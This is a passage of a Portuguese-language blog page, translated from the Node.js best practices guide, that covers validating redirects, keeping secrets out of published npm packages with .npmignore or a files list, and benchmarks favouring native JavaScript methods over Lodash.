  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">isAuthenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token function">getValidRedirect</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog <a href="https://blog.nodeswat.com/unvalidated-redirects-b0a2885720db" target="_blank" rel="nofollow noopener noreferrer">NodeSwat</a>:</p>
<blockquote>
<p>Felizmente, os métodos de atenuação para essa vulnerabilidade são bastante diretos. Não use a entrada do usuário não validada como base para o redirecionamento.</p>
</blockquote>
<p>Do blog <a href="https://blog.hailstone.io/how-to-prevent-unsafe-redirects-in-node-js/" target="_blank" rel="nofollow noopener noreferrer">Hailstone</a></p>
<blockquote>
<p>No entanto, se a lógica de redirecionamento do lado do servidor não validar os dados que entram no parâmetro url, seus usuários podem acabar em um site que se parece exatamente com o seu (examp1e.com), mas atende às necessidades de hackers criminosos!</p>
</blockquote>
<h2>6.25. Evite publicar segredos no registro do npm</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20Amea&#xE7;as%20OWASP%20-%20A6:Configura&#xE7;&#xE3;o%20Incorreta%20de%20Seguran&#xE7;a%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Precauções devem ser tomadas para evitar o risco de publicação acidental de segredos nos registros públicos do npm. Um arquivo <code class="language-text">.npmignore</code> pode ser usado para colocar arquivos ou pastas específicos em uma blacklist, ou a lista <code class="language-text">files</code> no <code class="language-text">package.json</code> pode atuar como uma whitelist.</p>
<p><strong>Caso contrário:</strong> As chaves, as senhas ou outros segredos da API do seu projeto estão sujeitos a abusos por qualquer pessoa que os encontre, o que pode resultar em perda financeira, falsificação de identidade e outros riscos.</p>
<h1>Evite publicar segredos no registro do npm</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Precauções devem ser tomadas para evitar o risco de publicação acidental de segredos nos registros públicos do npm. Um arquivo <code class="language-text">.npmignore</code> pode ser usado para colocar arquivos ou pastas específicos em uma blacklist, ou a lista <code class="language-text">files</code> no <code class="language-text">package.json</code> pode atuar como uma whitelist.</p>
<p>Para obter uma visão do que o npm publish realmente publicará no registro, o sinalizador <code class="language-text">--dry-run</code> pode ser adicionado ao comando npm publish para fornecer uma visão detalhada do pacote tarbell criado.</p>
<p>É importante notar que se um projeto estiver utilizando os arquivos <code class="language-text">.npmignore</code> e<code class="language-text">.gitignore</code>, tudo o que não estiver em <code class="language-text">.npmignore</code> será publicado no registro (isto é, o arquivo<code class="language-text">.npmignore</code> substitui o <code class="language-text">. gitignore</code>). Esta condição é uma fonte comum de confusão e é um problema que pode levar ao vazamento de segredos. Os desenvolvedores podem acabar atualizando o arquivo <code class="language-text">.gitignore</code>, mas esquecem de atualizar<code class="language-text">.npmignore</code> também, o que pode levar a que um arquivo potencialmente sensível não seja empurrado para o controle de origem, mas ainda seja incluído no pacote npm.</p>
<h3>Exemplo de Código</h3>
<p>Exemplo de arquivo .npmignore</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">#tests
test
coverage

#build tools
.travis.yml
.jenkins.yml

#environment
.env
.config</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Exemplo uso de uma lista de arquivos no package.json</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">{ 
  &quot;files&quot; : [
    &quot;dist/moment.js&quot;,
    &quot;dist/moment.min.js&quot;
  ]
}</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog de <a href="https://snyk.io/blog/ten-npm-security-best-practices/" target="_blank" rel="nofollow noopener noreferrer">Liran Tal &#x26; Juan Picado em Snyk</a>:</p>
<blockquote>
<p>… Outra boa prática a adotar é utilizar a propriedade files em package.json, que funciona como whitelist e especifica a matriz de arquivos a serem incluídos no pacote a ser criado e instalado (enquanto o arquivo ignore funciona como uma lista negra). A propriedade files e um arquivo ignore podem ser usados ​​juntos para determinar quais arquivos devem ser incluídos explicitamente, assim como excluídos, do pacote. Ao usar ambos, o primeiro a propriedade files em package.json tem precedência sobre o arquivo ignore.</p>
</blockquote>
<p>Do <a href="https://blog.npmjs.org/post/165769683050/publishing-what-you-mean-to-publish" target="_blank" rel="nofollow noopener noreferrer">blog do npm</a></p>
<blockquote>
<p>… Quando você executa npm publish, o npm agrupa todos os arquivos no diretório atual. Ele toma algumas decisões sobre o que incluir e o que ignorar. Para tomar essas decisões, ele usa o conteúdo de vários arquivos no diretório do projeto. Esses arquivos incluem .gitignore, .npmignore e a matriz de arquivos no pacote.json. Também inclui sempre certos arquivos e ignora outros.</p>
</blockquote>
<h1><code class="language-text">7. Boas Práticas em Performance</code></h1>
<h2>Nossos colaboradores estão trabalhando nesta seção. <a href="https://github.com/goldbergyoni/nodebestpractices/issues/256" target="_blank" rel="nofollow noopener noreferrer">Gostaria de participar?</a></h2>
<h2>7.1. Prefira métodos JS nativos ao invés de utilitários de usuário, como o Lodash</h2>
<p><strong>TL;DR:</strong> Muitas vezes é mais complicado usar bibliotecas de utilitários como o <code class="language-text">lodash</code> e <code class="language-text">underscore</code> sobre os métodos nativos, pois leva a dependências desnecessárias e desempenho mais lento.
Tenha em mente que, com a introdução do novo motor V8 juntamente com os novos padrões ES, os métodos nativos foram aprimorados de tal forma que agora ele tem cerca de 50% a mais de desempenho que as bibliotecas de utilitários.</p>
<p><strong>Caso contrário:</strong> Você terá que manter projetos de menor desempenho onde você poderia simplesmente ter usado o que <strong>já estava</strong> disponível ou lidar com mais algumas linhas em troca de mais alguns arquivos.</p>
<h1>Prefira métodos nativos ao invés de utilitários do usuário como Lodash</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Às vezes, usar métodos nativos é melhor do que requerir <code class="language-text">lodash</code> ou <code class="language-text">underscore</code>, porque isso não levará a um aumento de desempenho e usará mais espaço do que o necessário.
O desempenho usando métodos nativos resulta em um <a href="https://github.com/Berkmann18/NativeVsUtils/blob/master/analysis.xlsx" target="_blank" rel="nofollow noopener noreferrer">ganho geral de 50%</a> que inclui os seguintes métodos: <code class="language-text">Array.concat</code>, <code class="language-text">Array.fill</code>, <code class="language-text">Array.filter</code>, <code class="language-text">Array.map</code>, <code class="language-text">(Array|String).indexOf</code>, <code class="language-text">Object.find</code>, …</p>
<!-- compare aqui: https://gist.github.com/Berkmann18/3a99f308d58535ab0719ac8fc3c3b8bb-->
<h3>Exemplo: comparação de benchmark - Lodash vs V8 (Nativo)</h3>
<p>O gráfico abaixo mostra a <a href="https://github.com/Berkmann18/NativeVsUtils/blob/master/nativeVsLodash.ods" target="_blank" rel="nofollow noopener noreferrer">média dos benchmarks para uma variedade de métodos do Lodash</a>, Isso mostra que os métodos Lodash levam em média 146,23% mais tempo para completar as mesmas tarefas que os métodos V8.</p>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/sampleMeanDiag.png?raw=true" alt="meanDiag"></p>
<h3>Exemplo de código – teste de Benchmark com <code class="language-text">_.concat</code>/<code class="language-text">Array.concat</code></h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> _ <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  __ <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'underscore'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  Suite <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'benchmark'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Suite<span class="token punctuation">,</span>
  opts <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./utils'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//cf. https://github.com/Berkmann18/NativeVsUtils/blob/master/utils.js</span>

<span class="token keyword">const</span> concatSuite <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Suite</span><span class="token punctuation">(</span><span class="token string">'concat'</span><span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

concatSuite<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> _<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'underscore'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> __<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'native'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> array<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string">'async'</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Que retornará isso:</p>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/concat-benchmark.png?raw=true" alt="output"></p>
<p>Você pode encontrar uma lista maior de benchmarks <a href="https://github.com/Berkmann18/NativeVsUtils/blob/master/index.txt" target="_blank" rel="nofollow noopener noreferrer">aqui</a> ou alternativamente <a href="https://github.com/Berkmann18/NativeVsUtils/blob/master/index.js" target="_blank" rel="nofollow noopener noreferrer">executar isso</a> que mostraria o mesmo porém com cores.</p>
<h3>Citação de Blog: “Você (talvez) não precisa de Lodash/Underscore”</h3>
<p>Do <a href="https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore" target="_blank" rel="nofollow noopener noreferrer">repositório sobre esse assunto que foca em Lodash e Underscore</a>.</p>
<blockquote>
<p>O Lodash e o Underscore são ótimas bibliotecas de utilitários JavaScript moderno e são amplamente utilizados por desenvolvedores front-end. No entanto, quando você está focando nos navegadores modernos, você pode descobrir que existem muitos métodos que já são suportados nativamente graças ao ECMAScript5 [ES5] e ao ECMAScript2015 [ES6]. Se você quer que seu projeto exija menos dependências, e você conhece claramente o seu navegador de destino, talvez você não precise do Lodash/Underscore.</p>
</blockquote>
<h3>Exemplo: Linting para uso de métodos não nativos</h3>
<p>Existe um <a href="https://www.npmjs.com/package/eslint-plugin-you-dont-need-lodash-underscore" target="_blank" rel="nofollow noopener noreferrer">plugin de ESLint</a> que detecta onde você está usando bibliotecas, mas não precisa, alertando com sugestões (veja o exemplo abaixo).<br>
A maneira de configurá-lo é adicionando o plugin <code class="language-text">eslint-plugin-you-dont-need-lodash-underscore</code> no seu arquivo de configuração do ESLint:</p>
<div class="gatsby-highlight" data-language="json"><pre style="counter-reset: linenumber NaN" class="language-json line-numbers"><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">"extends"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token string">"plugin:you-dont-need-lodash-underscore/compatible"</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo: detectando uso de utilidades não nativas do v8 usando um linter</h3>
<p>Considere o arquivo abaixo:</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">const</span> _ <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// O ESLint sinalizará a linha acima com uma sugestão</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token parameter">x</span> <span class="token operator">=></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">d</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>x<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>Aqui está o que o ESLint produziria ao usar o plugin YDNLU.
<img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/ydnlu.png?raw=true" alt="output"></p>
<p>Naturalmente, o exemplo acima não parece realista, considerando o que bases de código reais teriam, mas você entendeu a idéia.</p>
<h3>Referências</h3>
<ul>
<li><a href="https://github.com/goldbergyoni/nodebestpractices" target="_blank" rel="nofollow noopener noreferrer">Inpirado e modificado do repositório</a></li>
</ul>
<hr>
<p><a href="http://bit.ly/pauloluan-insta" target="_blank" rel="nofollow noopener noreferrer"><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_qQqH59e--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3jzrvlwsqdrz7j5wgtxb.png" alt="Instagram Paulo Luan"></a></p>
<hr></section><hr style="margin-bottom:1.75rem"/><footer></footer></article></main><footer>2021<!-- --> <a href="https://bit.ly/pauloluan-insta">Reativa Tecnologia</a></footer></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script src="https://platform.twitter.com/widgets.js"></script><script src="https://www.instagram.com/embed.js"></script><script src="https://embedr.flickr.com/assets/client-code.js"></script><script>
  
  
  if(true) {
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  }
  if (typeof ga === "function") {
    ga('create', 'UA-155080700-5', 'auto', {});
      
      
      
      
      
      }</script><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/nodebestpractices/1/";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-78cdc6a84a6e659c51c0.js"],"app":["/app-6d831502f5b033c00c9a.js"],"component---src-pages-404-js":["/component---src-pages-404-js-443b9414fd7616b09644.js"],"component---src-pages-index-js":["/component---src-pages-index-js-1b8a1780a3d052ddcc51.js"],"component---src-templates-blog-post-js":["/component---src-templates-blog-post-js-eea8ccbf252e87f3a147.js"]};/*]]>*/</script><script src="/polyfill-78cdc6a84a6e659c51c0.js" nomodule=""></script><script src="/component---src-templates-blog-post-js-eea8ccbf252e87f3a147.js" async=""></script><script src="/cd7d5f864fc9e15ed8adef086269b0aeff617554-1c0ef869a859675a1e93.js" async=""></script><script src="/commons-8efd3e762cdb1d39fca0.js" async=""></script><script src="/app-6d831502f5b033c00c9a.js" async=""></script><script src="/532a2f07-8d0154c2cf59560b38a4.js" async=""></script><script src="/framework-8e528b732ab2eaadb7b7.js" async=""></script><script src="/styles-755093da0c07f4b49226.js" async=""></script><script src="/webpack-runtime-21c9d4a6b4882039bec8.js" async=""></script></body></html>